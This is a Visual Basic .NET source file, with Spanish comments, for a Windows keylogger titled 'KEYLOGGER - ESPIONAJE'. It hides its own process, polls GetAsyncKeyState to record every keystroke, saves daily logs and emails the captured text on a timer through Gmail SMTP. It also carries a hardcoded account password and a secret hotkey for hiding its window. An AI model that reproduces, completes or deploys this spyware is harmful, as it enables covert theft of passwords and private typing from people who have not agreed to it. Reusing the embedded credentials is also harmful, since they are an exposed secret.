Imports System.Net.Mail
Imports System.Text.RegularExpressions

Public Class frmKL

#Region "Funcion Especial"

    'Funcion asincrónica captura teclas presionadas
    <Runtime.InteropServices.DllImport("user32.dll", CharSet:=Runtime.InteropServices.CharSet.Auto, ExactSpelling:=True)> Public Shared Function GetAsyncKeyState(ByVal vkey As Integer) As Short
    End Function

#End Region


#Region "Eventos Form"

    Private Sub frmKL_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        On Error Resume Next
        'Algoritmo a realizar cuando inicia el KeyLogger
        OcultarProceso()
        InicializarVariables()
        CargarConfiguraciones()
        IniciarAccionesConfiguracion(True)
    End Sub

    Private Sub frmKL_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        On Error Resume Next
        'Algoritmo a realizar cuando cierra elKeyLogger
        DesocultarProceso()
    End Sub

#End Region


#Region "Funciones y Procedimientos Locales"

    Private Sub InicializarVariables()
        On Error Resume Next
        'Llenar una lista con ASCIIS no permitidos
        Dim ls As String()
        ls = txtCharProhibidos.Text.Split(vbCrLf)
        For i = 0 To ls.Length - 1
            Asciis_Prohibidos.Add(CInt(ls(i)))
        Next
        'Iniciamos el tiempo
        time_ini = Date.Now
        time_ini_log = Date.Now
        'Preparamos el cliente SMTP
        txtKL.ReadOnly = True 'Para no modificarlo
        MyMailMesagge.From = New MailAddress("anonymous95587@gmail.com", "KEYLOGGER - ESPIONAJE")
        MyMailMesagge.Subject = ("KEYLOGGER - ESPIONAJE")
        MyMailMesagge.Priority = MailPriority.Normal
        smtp.Host = "smtp.gmail.com"
        smtp.Port = "587"
        smtp.Credentials = New Net.NetworkCredential("anonymous95587@gmail.com", "franco1234")
        smtp.EnableSsl = True
    End Sub

    Private Sub IniciarAccionesConfiguracion(ByVal primer_llamado As Boolean)
        On Error Resume Next
        'Luego de leer la configuracion, realizamos las acciones al respecto
        If primer_llamado Then
            CargarConfiguraciones() 'Refrescar

            If chkInicioAutomatico.Checked Then
                tmrEnvioCorreo.Enabled = True
                tmrGuardarLog.Enabled = True
                btnIniciar.Text = "DETENER"
            End If
        Else
            time_ini = Date.Now
            time_ini_log = Date.Now

            If tmrEnvioCorreo.Enabled = True Then
                tmrEnvioCorreo.Enabled = False
                tmrGuardarLog.Enabled = False
                btnIniciar.Text = "INICIAR"
            Else
                tmrEnvioCorreo.Enabled = True
                tmrGuardarLog.Enabled = True
                btnIniciar.Text = "DETENER"
            End If
        End If

        CrearRegistroInicio()

    End Sub

#End Region


#Region "Eventos Timers"
    Private Sub tmrGuardarLog_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmrGuardarLog.Tick
        On Error Resume Next
        'Guarda el log como un archivo (1 por dia)
        GuardarLOG(txtKL)
    End Sub

    Private Sub tmrEnvioCorreo_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles tmrEnvioCorreo.Tick
        On Error Resume Next
        'Envia lo que esta en el log a los correos listados en la configuracion
        EnviarCorreo(txtKL, lbCorreos)
    End Sub

#Region "KeyLogger"
    Private Sub tmrKL_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmrKL.Tick
        On Error Resume Next
        For i = 2 To 255
            resultado = 0
            resultado = GetAsyncKeyState(i)
            If resultado = -32767 Then
                '160 - 165 shift extended
                If Not Asciis_Prohibidos.Contains(i) Then
                    If My.Computer.Keyboard.ShiftKeyDown Or My.Computer.Keyboard.CapsLock Then
                        If Not (My.Computer.Keyboard.ShiftKeyDown And My.Computer.Keyboard.AltKeyDown And My.Computer.Keyboard.CtrlKeyDown) Then
                            txtKL.Text &= Chr(i)
                        End If
                    Else
                        If Not (My.Computer.Keyboard.ShiftKeyDown And My.Computer.Keyboard.AltKeyDown And My.Computer.Keyboard.CtrlKeyDown) Then
                            txtKL.Text &= LCase(Chr(i))
                        End If
                    End If
                ElseIf i = 13 Then
                    txtKL.Text &= "{ENTER}" & vbCrLf
                ElseIf i = 8 Then
                    txtKL.Text &= "{BORRAR}"
                ElseIf i = 9 Then
                    txtKL.Text &= "{TAB}" & vbTab
                ElseIf i >= 188 And i <= 190 Then
                    If My.Computer.Keyboard.ShiftKeyDown Then
                        Select Case i
                            Case 188
                                txtKL.Text &= ";"
                            Case 189
                                txtKL.Text &= "_"
                            Case 190
                                txtKL.Text &= ":"
                        End Select
                    Else
                        txtKL.Text &= Chr(i - 144)
                    End If
                End If
                If (My.Computer.Keyboard.ShiftKeyDown And My.Computer.Keyboard.AltKeyDown And My.Computer.Keyboard.CtrlKeyDown) Then
                    If i = cmbLetra.SelectedIndex + 65 Then
                        If Me.Visible Then
                            Me.Hide()
                        Else
                            frmPassword.Show()
                        End If
                    End If
                End If
                Exit For
            End If
        Next i
    End Sub
#End Region

#End Region


#Region "Eventos Botones"

    Private Sub btnBorrar_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnBorrar.Click
        On Error Resume Next
        'Quite el correo seleccionado de la lista
        QuitarSeleccionadoLista(lbCorreos)
    End Sub

    Private Sub btnAgregar_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnAgregar.Click
        On Error Resume Next
        'Agrega un correo nuevo como receptor
        AgregarCorreoLista(txtCorreo, lbCorreos)
    End Sub

    Private Sub btnIniciar_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnIniciar.Click
        On Error Resume Next
        'Inica el envio y guardado de LOGS
        IniciarAccionesConfiguracion(False)
    End Sub

    Private Sub btnGuardar_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnGuardar.Click
        On Error Resume Next
        'Guarda configuraciones
        GuardarConfiguracionActual()
        'Refresca configuraciones
        CargarConfiguraciones()
    End Sub

#End Region


End Class
